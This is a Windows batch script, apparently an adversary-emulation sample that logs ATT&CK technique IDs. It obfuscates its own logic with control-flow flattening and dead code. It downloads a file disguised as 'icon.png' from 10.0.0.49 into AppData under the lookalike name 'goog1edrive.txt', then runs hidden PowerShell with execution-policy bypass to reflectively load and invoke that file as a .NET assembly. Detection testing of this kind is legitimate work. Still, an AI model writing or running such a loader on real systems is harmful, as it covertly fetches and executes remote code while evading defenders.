@echo off
SETLOCAL EnableDelayedExpansion

REM Placeholder variable declarations (obfuscated identifiers – semantic meaning stripped)
SET aqwxc=%APPDATA%\10247\c8205c94
SET bnmji=goog1edrive.txt
SET cxkmp=https://10.0.0.49/stage/2/icon.png?10247-7
SET dretn=ITZEL-S2BO
SET eflvy=10247
SET ghrhy=7
SET jklxz=%APPDATA%\7\macula-simulations.log
SET lmnop=Dale     REM Reserved for deployment patcher
SET qrstu=Microsoft.Win32.TaskScheduler.NativeBridge       REM Reserved for deployment patcher
SET vwxyz=%APPDATA%\7        REM Reserved for deployment patcher

REM Ensure endpoint directory exists
if not exist "%APPDATA%\!ghrhy!" mkdir "%APPDATA%\!ghrhy!"

REM ============================================================
REM Control-Flow Flattening State Machine (all identifiers renamed)
REM State variable: xytre
REM Opaque predicate: pmonk
REM Switch: luwet, Nested: qwert, Error level: zxcbn
REM Labels: trwxc (loop), njhgt (end)
REM ============================================================
SET /a xytre=0
:trwxc
if %xytre% EQU -1 goto :njhgt
if %xytre% EQU 0 (
    REM STATE 0: Opaque predicate setup (always true)
    set /a pmonk=%time:~-1% + 0
    if !pmonk! LSS 10 (
        REM Real initialization
        set /a xytre=1
    ) else (
        REM Dead code (never reaches)
        echo This is dead code >nul
        set /a xytre=99
    )
    goto :trwxc
)
if %xytre% EQU 1 (
    REM STATE 1: Heartbeat fetch with nested conditionals
    set /a luwet=!random! %% 1 + 1
    if !luwet! EQU 1 (
        if "%time:~0,2%" LSS "99" (
            echo [%date% %time%][DEBUG][!dretn!][!eflvy!]: heartbeat_start >> !jklxz!
            curl -k -s -o "!aqwxc!\!bnmji!" "!cxkmp!"
            echo [%date% %time%][DEBUG][!dretn!][!eflvy!]: heartbeat_complete >> !jklxz!
            set /a xytre=2
        ) else (
            REM Dead code branch (hours never exceed 99)
            echo fake_heartbeat >> !jklxz!
            set /a xytre=99
        )
    ) else (
        REM Dead code switch case
        echo dead_switch >nul
        set /a xytre=99
    )
    goto :trwxc
)
if %xytre% EQU 2 (
    REM STATE 2: Change directory with debug
    cd /d "!aqwxc!"
    echo [%date% %time%][DEBUG][!dretn!][!eflvy!]: chdir_result=!errorlevel! >> !jklxz!
    set /a xytre=3
    goto :trwxc
)
if %xytre% EQU 3 (
    REM STATE 3: PowerShell invocation via LOLBIN (PWS) – debug line uses 'msbuild_start'
    set /a qwert=%date:~10,4% * 0 + 1
    if !qwert! EQU 1 (
        echo [%date% %time%][DEBUG][!dretn!][!eflvy!]: msbuild_start >> !jklxz!
        powershell.exe -nop -w hidden -ep bypass -Command "& { [Reflection.Assembly]::Load([IO.File]::ReadAllBytes('%APPDATA%\10247\c8205c94\goog1edrive.txt')).GetType('Microsoft.Win32.TaskScheduler.NativeBridge').GetMethod('Dale').Invoke($null, $null) }"
        set /a zxcbn=!errorlevel!
        echo [%date% %time%][DEBUG][!dretn!][!eflvy!]: powershell_complete >> !jklxz!
        set /a xytre=4
    ) else (
        REM Dead code nested branch (never enters)
        echo fake_ps >nul
        set /a xytre=99
    )
    goto :trwxc
)
if %xytre% EQU 4 (
    REM STATE 4: TTP logging and obfuscation success (identifiers already renamed)
    if !zxcbn! EQU 0 (
        echo [%date% %time%][TTP][!dretn!][!eflvy!]: T1218|System Binary Proxy Execution=[OK]:[] >> !jklxz!
    ) else (
        echo [%date% %time%][TTP][!dretn!][!eflvy!]: T1218|System Binary Proxy Execution=[FAIL]:[msbuild_execution_failed] >> !jklxz!
    )
    REM Obfuscation pass (member renaming) applied statically – log success
    echo [%date% %time%][TTP][!dretn!][!eflvy!]: T1027|Obfuscated Files or Information=[OK]:[] >> !jklxz!
    set /a xytre=-1
    goto :trwxc
)
REM Fallback dead state
echo Unexpected state >nul
set /a xytre=-1
goto :trwxc

:njhgt
ENDLOCAL